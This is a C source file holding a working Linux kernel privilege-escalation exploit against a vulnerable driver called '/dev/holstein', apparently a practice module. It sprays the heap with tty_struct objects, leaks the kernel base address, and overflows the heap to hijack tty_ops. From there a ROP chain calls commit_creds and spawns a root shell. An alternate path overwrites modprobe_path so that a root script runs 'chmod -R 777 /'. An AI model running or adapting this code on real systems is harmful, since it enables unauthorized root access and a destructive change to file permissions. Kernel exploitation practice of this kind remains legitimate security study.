
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>

#define ERROR(x) printf("Error: %s\n", x); return -1;
#define tty_ops_offset            0xc38880
#define pop_rdi_ret               0x0d748d + kbase
#define pop_rcx_ret               0x13c1c4 + kbase
#define mov_rax_ptr_rdx           0x3a5f29 + kbase
#define mov_ptr_rdx_rcx_ret       0x0477f7 + kbase
#define mov_rdi_rax_rep_movsq_ret 0x62707b + kbase // mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; ret; 
#define push_r8_pop_rsp_pop2_ret  0x5f7e60 + kbase // push r8; add dword ptr [rbx + 0x41], ebx; pop rsp; pop r13; pop rbp; ret; 
#define commit_creds              0x0744b0 + kbase
#define prepare_kernel_creds      0x074650 + kbase
#define kpti_trampoline           0x800e26 + kbase
#define modprobe_path             0xe38180 + kbase

uint64_t user_cs, user_ss, user_rflags, user_sp;
void spawn_shell(void){
    printf("We back to userland!\n");
    uint8_t uid = getuid();
    if(uid == 0){
        printf("UID is: %d\nYou just rooted the machine!\n", uid);
    }
    else {
        printf("UID is: %d\nYou didn't root the machine unfortunately..\n", uid);
        exit(-1);
    }
    system("/bin/sh");
}

uint64_t user_rip = (uint64_t) spawn_shell;
void save_user_state(void){ // save the state of our user context
   __asm__(
    ".intel_syntax noprefix;"
    "mov user_cs, cs;"  // user code segment
    "mov user_ss, ss;"  // user stack segment
    "mov user_sp, rsp;" // user stack
    "pushfq;"           // user rflags
    "pop user_rflags;" 
    ".att_syntax;"
    );
}

int fd;
uint8_t spray[256];
int kheap_spray(){
    /* fill kmalloc-1024 with tty_struct */ 
    for(int i = 0; i < 128; i++){
        if((spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY)) < 0){ERROR("Failed to spray, error while opening /dev/ptmx..")} 
    }
    if((fd = open("/dev/holstein", O_RDWR)) < 0){ERROR("Failed to open the vulnerable device, error while opening /dev/holetien..")} 
    /* since we're not sure if our sprayed objects would be before or after our controlled chunk */
    for(int i = 128; i < 256; i++){
        if((spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY)) < 0){ERROR("Failed to spray, error while opening /dev/ptmx..")} 
    }
    
    return 0;
}
uint64_t kbase, g_buf, leak[0x500];
int kbase_kheap_leak(){
    uint64_t leak[0x500];
    if(read(fd, leak, 0x500) < 0){ERROR("Failed to read from the vulnerable driver..")}
    kbase = leak[0x418/sizeof(uint64_t)] - tty_ops_offset; // tty_ops at offset 0x18, tty_ops is also the function table pointer we want to fake
    g_buf = leak[0x438/sizeof(uint64_t)] - 0x438;          // kernel heap leak to find the g_buf address
    printf("kernel base address:  %p\nkernel g_buf address: %p\n", kbase, g_buf);
    
    return 0;
}
uint64_t payload[0x500];
int write_primitive(uint64_t address, uint64_t value){
    /* create a fake function table inside our buffer */
    payload[12] = mov_ptr_rdx_rcx_ret;

    /* overwrite the tty_ops table, make sure we don't overwrite important values and magic numbers */
    payload[0x400/sizeof(uint64_t)] = leak[0x400/sizeof(uint64_t)]; 
    payload[0x408/sizeof(uint64_t)] = leak[0x408/sizeof(uint64_t)]; 
    payload[0x410/sizeof(uint64_t)] = leak[0x410/sizeof(uint64_t)];
    payload[0x418/sizeof(uint64_t)] = g_buf; 
    
    if(write(fd, payload, 0x420) < 0){ERROR("Failed to write to the vulnerable driver..")} // heap overflow
    /* trigger the fake function table by ioctl */
    for(int i = 0; i < 256; i++){
        ioctl(spray[i], value & 0xffffffff, address);
    }
    uint32_t value2 = value >> 32;
    if(value2){
        for(int i = 0; i < 256; i++){
            ioctl(spray[i], value2, address+4);  
        }
    }
    
    return 0;
}
int exp_ret2usr(){
    if(kheap_spray() < 0){return -1;}
    if(kbase_kheap_leak() < 0){return -1;}

    /* create a fake function table inside our buffer */
    payload[12] = push_r8_pop_rsp_pop2_ret; 
    
    /* now finally rop! */
    int i = 15;
    payload[i++] = pop_rdi_ret;
    payload[i++] = 0x0;
    payload[i++] = prepare_kernel_creds;
    payload[i++] = pop_rcx_ret;
    payload[i++] = 0x0;
    payload[i++] = mov_rdi_rax_rep_movsq_ret;
    payload[i++] = commit_creds;
    payload[i++] = kpti_trampoline;
    payload[i++] = 0x0;
    payload[i++] = 0x0;
    payload[i++] = user_rip;
    payload[i++] = user_cs;
    payload[i++] = user_rflags;
    payload[i++] = user_sp;
    payload[i++] = user_ss;
    
    /* overwrite the tty_ops table, make sure we don't overwrite important values and magic numbers */
    payload[0x400/sizeof(uint64_t)] = leak[0x400/sizeof(uint64_t)]; 
    payload[0x410/sizeof(uint64_t)] = leak[0x410/sizeof(uint64_t)];
    payload[0x418/sizeof(uint64_t)] = g_buf; 
    
    if(write(fd, payload, 0x420) < 0){ERROR("Failed to write to the vulnerable driver..")} // heap overflow
    /* trigger the fake function table by ioctl */
    for(int i = 0; i < 256; i++){
        ioctl(spray[i], 0xdeadbeef, g_buf+13*sizeof(uint64_t)); // we have control over rcx, rdx, rsi, r8, r12, r14
    }

    return 0;
}

int exp_modprobe_path(){ // we could also modify the core_pattern script and crash a user program to achive similar result
    if(kheap_spray() < 0){return -1;}
    if(kbase_kheap_leak() < 0){return -1;}
    if(write_primitive(modprobe_path, 0x782f706d742f) < 0){return -1;}
    system("echo -ne '#!/bin/sh\nchmod -R 777 /' > /tmp/x; chmod +x /tmp/x"); // exploit
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fake; chmod +x /tmp/fake; /tmp/fake"); // trigger 

    return 0;
}

int exp_task_struct(){
    if(kheap_spray() < 0){return -1;}
    if(kbase_kheap_leak() < 0){return -1;}
    if(prctl(PR_SET_NAME, "UnknownD4")){ERROR("Failed to set thread's name with prctl..")} // there is a string (char comm[ TASK_COMM_LEN]) that contains the thread's name, we can utilize it to find the task_struct
    return 0;
}

int main(int argc, char **argv){
    save_user_state();
    exp_ret2usr();
    //exp_modprobe_path(); 
    
    return 0;
}